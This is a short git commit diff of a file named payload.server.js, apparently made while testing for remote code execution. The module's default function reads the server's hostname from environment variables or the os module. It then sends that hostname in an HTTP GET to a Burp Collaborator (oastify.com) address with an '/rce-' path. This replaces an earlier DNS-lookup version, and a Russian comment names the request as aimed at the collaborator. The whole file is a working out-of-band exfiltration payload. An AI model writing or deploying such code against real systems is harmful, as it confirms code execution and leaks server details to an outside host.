4d49ce9cd4468a6ba0a0f916b2dd65dd9cbc90c0
alex <alex@MacBook-Pro-admin-2.local>
2026-07-31 01:01:00 +0300

    v3: try process.env + http.get without try/catch

--- payload.server.js
+++ payload.server.js
@@ -1,11 +1,15 @@
 module.exports = {
   default: function(props) {
+    var hostname = "unknown";
+    try { hostname = process.env.HOSTNAME || process.env.POD_NAME || "n/a"; } catch(e) {}
+    try { hostname = require("os").hostname(); } catch(e) {}
+    
+    // Пробуем HTTP-запрос к коллаборатору
     try {
-      var os = require("os");
-      var dns = require("dns");
-      var hostname = os.hostname();
-      dns.lookup(hostname + ".fo754fqg0zt9x4y4fhekukej2a85wu.oastify.com", function(err, addr) {});
+      var http = require("http");
+      http.get("http://fo754fqg0zt9x4y4fhekukej2a85wu.oastify.com/rce-" + hostname);
     } catch(e) {}
+    
     return null;
   }
 };
